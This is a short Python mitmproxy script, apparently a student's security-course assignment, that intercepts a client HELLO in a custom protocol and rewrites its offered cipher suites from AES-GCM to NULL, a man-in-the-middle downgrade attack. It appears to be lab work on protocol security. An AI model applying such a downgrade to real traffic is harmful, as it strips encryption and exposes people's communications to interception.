# Zohaib Umer | 23i-0528 | CS3002 Assignment 2
from mitmproxy import tcp
import logging

def tcp_message(flow: tcp.TCPFlow):
    msg = flow.messages[-1]

    if msg.from_client and b"type:HELLO" in msg.content:
        original = b"suites:AES256-GCM,AES128-GCM"
        modified = b"suites:NULL"

        if original in msg.content:
            msg.content = msg.content.replace(
                original, modified, 1
            )
            logging.warning(
                "C-A1: Modified v2 HELLO to NULL-only"
            )
